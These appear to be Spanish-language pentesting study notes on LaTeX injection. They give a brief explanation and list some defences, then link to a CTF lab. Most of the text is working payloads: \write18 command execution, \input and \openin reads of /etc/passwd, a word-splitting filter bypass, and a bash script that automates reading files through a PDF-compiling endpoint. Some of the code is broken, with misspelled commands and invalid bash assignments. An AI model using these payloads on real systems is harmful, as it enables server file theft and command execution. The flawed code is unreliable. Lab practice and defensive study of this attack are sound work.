# Inyecciones LaTeX

Tags: #LaTexInjection #OWASP #Explotacion 

Las **inyecciones LaTeX** son un tipo de ataque que se aprovecha de las vulnerabilidades en las aplicaciones web que permiten a los usuarios ingresar **texto formateado** en LaTeX. LaTeX es un sistema de composición de textos que se utiliza comúnmente en la escritura académica y científica.

Los ataques de inyección LaTeX ocurren cuando un atacante ingresa código LaTeX malicioso en un campo de entrada de texto que luego se procesa en una aplicación web. El código LaTeX puede ser diseñado para aprovechar vulnerabilidades en la aplicación y **ejecutar código malicioso** en el servidor.

Un ejemplo de una inyección LaTeX podría ser un ataque que aprovecha la capacidad de LaTeX para incluir gráficos y archivos en una aplicación web. Un atacante podría enviar un código LaTeX que incluya un enlace a un archivo malicioso, como un virus o un troyano, que podría infectar el servidor o los sistemas de la red.

Para evitar las inyecciones LaTeX, las aplicaciones web deben validar y limpiar adecuadamente los datos que se reciben antes de procesarlos en LaTeX. Esto incluye la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en LaTeX.

También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades de la aplicación para detectar posibles inyecciones. Además, se debe fomentar la educación sobre la seguridad en el uso de LaTeX y cómo evitar la introducción de código malicioso.

A continuación, se os proporciona el enlace correspondiente al proyecto de Github que nos descargamos para desplegar un laboratorio vulnerable donde poder practicar esta vulnerabilidad:

-   **Laboratorio LaTeX Injection**: [https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)


## Comandos 

* [Latex-Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection)
* [0day-Latex](https://0day.work/hacking-with-latex/)

Cuando si podamos usar el comando **input**
```bash
\immediate\write18{cat /etc/passwd | bas64 > output}
\input{output}

# En nuestra maquina victima nos podemos pegar el resultado en base64 en un archvivo llamado 'data' y aplicar el siguiente comando
❯ cat data | tr -d '\n' | base64 -d; echo  
```

Una forma de 'burlar' es colocar la palabra en pedazos
```bash
\def\first{pep}
\def\second{ito}
\fist\second                                    # Aqui nos uniria las dos palabras
```

```bash
\input{/etc/passwd}                             # Leera el '/etc/passwd'
```
Aveces esta sanitizado con **--shell-escape** y no nos deja generar el pdf, ya que restringe los comandos **input|include**

Podemos hacerlo de otra manera
```bash
\newread\file                                   # Leera la primer linea del '/etc/passwd'
\openin\file=/etc/passwd
\read\file to\line                              # Si agregamos esta linea mas veces, podremos ver las lineas que siguen unicas
\text{\line}
\closein\file
```

```bash
\newread\file                                   # Leera la primer linea del '/etc/passwd'
\openin\file=/etc/passwd
\read\file to\lineA                            
\read\file to\lineB 
\text{\lineA\lineB}                             # Podremos ver la primer y segunda linea en una sola linea
\closein\file
```

```bash
\newread\file                                   # Leer por multiples lineas, pero aveces no le gusta algunos caracteres
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

Una mejor alternativa para hacer el de múltiple líneas es hacerlo de la siguiente manera:
```bash
❯ nvim get_files.sh
	#!/bin/bash

	# Variables globales 
	declare -r main_url = "http://localhosts/ajax.php"
	filename = $1

	if [$1]; then
		read_file_to_line = "%0A\read\file%20to\line"
		for i in $(seq 1 100); do
			file_to_download = $(curl -s -X POST $main_url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file%0A\openin\file=$filename$read_file_to_line%0A\text{\line}%0A\closein\file&template=blank" | grep -i download | awk 'NF{print $NF}')

			if [$file_to_donwload]; then 
				wget $file_to_download &>/dev/null
				file_to_convert=$(echo $file_to_download | tr '/' ' ' | awk 'NF{print $NF}')
				pdftotext $file_to_convert
				file_to_read=$(echo $file_to_convert | sed 's/\.pdf/\.txt/')
				rm $file_to_convert
				cat $file_to_read | head -n 1
				rm $file_to_read
				read_file_to_line+="%0A\read\file%20to\line"
			else 
				read_file_to_line+="%0A\read\file%20to\line"
			fi
		done
	else
		echo -e "\n[!] Uso: $0 /etc/passwd\n\n"
	fi 


# En codigo ASCII
	# %0A = \n  (salto de linea)
	# %20 = Espacio
```

```bash
\immediate\write18{id > output}             # Para poder ejecutar comandos, en eset caso sera el comando 'id'

\newread\file                               # Para leer en un archivo generado
\openin\file=output
\read\file to\line                              
\text{\line}
\closein\file
```

```bash
\immediate\write18{cat /etc/passwd > output.txt}             # Para poder ejecutar comandos y mirarlo en la web, en un archivo que se crea llamado output.txt en la ruta de 'localhost/compile/output.txt'
```